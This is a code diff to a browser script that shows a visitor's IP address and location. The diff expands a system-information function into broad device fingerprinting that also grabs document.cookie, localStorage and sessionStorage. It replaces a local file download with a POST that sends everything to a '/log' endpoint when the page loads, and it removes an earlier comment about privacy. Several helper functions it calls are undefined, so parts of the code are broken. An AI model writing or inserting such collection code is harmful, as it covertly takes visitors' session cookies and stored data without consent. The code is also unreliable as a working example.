@@ -15,7 +15,7 @@ async function getIPAddress() {
 // Function to fetch the user's geolocation based on IP address
 async function getGeolocation(ip) {
     try {
-        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        const response = await fetch(`https://ipapi.co/json/`);
         const data = await response.json();
         return {
             country: data.country_name,
@@ -30,19 +30,97 @@ async function getGeolocation(ip) {
     }
 }
 
-// Function to gather system information
-function getSystemInformation() {
-    const systemInfo = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        cookiesEnabled: navigator.cookieEnabled,
-        // You can add more system information here, but be mindful of privacy concerns
-    };
-    return systemInfo;
+// Function to display user information
+async function displayUserInfo() {
+    const ipAddress = await getIPAddress();
+    const geolocation = await getGeolocation(ipAddress);
+
+    if (ipAddress && geolocation) {
+        document.getElementById('ip-address').textContent = ipAddress;
+        document.getElementById('country').textContent = geolocation.country;
+        document.getElementById('region').textContent = geolocation.region;
+        document.getElementById('city').textContent = geolocation.city;
+        document.getElementById('latitude').textContent = geolocation.latitude;
+        document.getElementById('longitude').textContent = geolocation.longitude;
+    } else {
+        document.getElementById('user-info').innerHTML = '<p>Error fetching user information. Please try again later.</p>';
+    }
 }
 
-// Function to log user and system information and store as a file
+// Call the function to display user information
+displayUserInfo();
+
+/**
+ * Retrieves extensive system information
+ * @returns {object} The extensive system information
+ */
+function getSystemInformation() {
+  const systemInfo = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    appVersion: navigator.appVersion,
+    appName: navigator.appName,
+    appCodeName: navigator.appCodeName,
+    product: navigator.product,
+    productSub: navigator.productSub,
+    vendor: navigator.vendor,
+    vendorSub: navigator.vendorSub,
+    cookiesEnabled: navigator.cookieEnabled,
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth
+    },
+    deviceMemory: navigator.deviceMemory,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    maxTouchPoints: navigator.maxTouchPoints,
+    mediaDevices: navigator.mediaDevices,
+    permissions: navigator.permissions,
+    plugins: Array.from(navigator.plugins).map(plugin => ({
+      name: plugin.name,
+      filename: plugin.filename,
+      description: plugin.description
+    })),
+    doNotTrack: navigator.doNotTrack,
+    geolocation: navigator.geolocation,
+    connection: navigator.connection,
+    battery: navigator.getBattery(),
+    networkInformation: navigator.connection,
+    device: {
+      platform: navigator.platform,
+      appCodeName: navigator.appCodeName,
+      appName: navigator.appName,
+      appVersion: navigator.appVersion,
+      userAgent: navigator.userAgent
+    },
+    time: {
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      datetime: new Date().toString()
+    },
+    // Additional system information
+    cookies: document.cookie,
+    localStorage: window.localStorage,
+    sessionStorage: window.sessionStorage,
+    webRTC: navigator.mediaDevices.getUserMedia,
+    webGL: document.createElement('canvas').getContext('webgl'),
+    webAudio: window.AudioContext || window.webkitAudioContext,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    language: navigator.language,
+    devicePixelRatio: window.devicePixelRatio,
+    platform: navigator.platform,
+    plugins: Array.from(navigator.plugins).map(({ name }) => name),
+    userAgent: navigator.userAgent,
+    systemFonts: getSystemFonts(),
+    systemColors: getSystemColors(),
+    systemAudio: getAudioDevices()
+  };
+  return systemInfo;
+}
+// Function to log user and system information and send to server
 async function logUserInfo() {
     const ipAddress = await getIPAddress();
     if (!ipAddress) return;
@@ -62,19 +140,20 @@ async function logUserInfo() {
         systemInfo: getSystemInformation()
     };
 
-    // Convert user information to JSON
-    const userInfoJSON = JSON.stringify(userInfo, null, 2);
-
-    // Create a Blob containing the user information
-    const blob = new Blob([userInfoJSON], { type: 'application/json' });
-
-    // Create a link element to trigger the download
-    const link = document.createElement('a');
-    link.href = window.URL.createObjectURL(blob);
-    link.download = 'user.logs';
-
-    // Trigger the download
-    link.click();
+    // Send user information to server
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', '/log', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                console.log('User information logged successfully.');
+            } else {
+                console.error('Failed to log user information.');
+            }
+        }
+    };
+    xhr.send(JSON.stringify(userInfo));
 }
 
 // Call the function to log user information when the page loads
